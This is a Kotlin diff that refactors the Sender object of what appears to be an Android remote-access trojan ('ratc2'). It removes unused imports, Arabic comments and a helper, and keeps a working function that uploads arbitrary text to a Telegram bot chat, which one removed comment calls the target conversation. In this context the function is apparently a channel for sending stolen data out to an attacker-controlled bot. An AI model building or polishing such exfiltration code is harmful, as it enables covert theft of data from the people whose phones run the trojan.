@@ -1,8 +1,6 @@
 package com.spud.ratc2
 
 import android.util.Log
-import java.io.BufferedReader
-import java.io.InputStreamReader
 import java.io.OutputStream
 import java.net.HttpURLConnection
 import java.net.URL
@@ -29,13 +27,6 @@ object Sender {
         return c.inputStream.bufferedReader().readText()
     }
 
-    /**
-     * يرسل ملف نصي كمرفق في تيليجرام (multipart/form-data)
-     * @param botBase https://api.telegram.org/bot<TOKEN>
-     * @param chatId  محادثة الهدف
-     * @param filename اسم الملف الظاهر في تيليجرام
-     * @param content  محتوى الملف كنص UTF-8
-     */
     fun sendDocument(botBase: String, chatId: String, filename: String, content: String): Boolean {
         return try {
             val boundary = "----SpudBoundary" + UUID.randomUUID().toString().replace("-", "")
@@ -48,21 +39,18 @@ object Sender {
             conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
 
             val out: OutputStream = conn.outputStream
-            val w = { s: String -> out.write(s.toByteArray(Charsets.UTF_8)) }
+            fun w(s: String) { out.write(s.toByteArray(Charsets.UTF_8)) }
 
-            // chat_id
             w("--$boundary\r\n")
             w("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n")
             w("$chatId\r\n")
 
-            // document
             w("--$boundary\r\n")
             w("Content-Disposition: form-data; name=\"document\"; filename=\"$filename\"\r\n")
             w("Content-Type: text/plain; charset=utf-8\r\n\r\n")
             w(content)
             w("\r\n")
 
-            // نهاية
             w("--$boundary--\r\n")
             out.flush()
             out.close()
@@ -75,7 +63,4 @@ object Sender {
             false
         }
     }
-
-    fun readAll(input: java.io.InputStream): String =
-        BufferedReader(InputStreamReader(input)).use { it.readText() }
 }
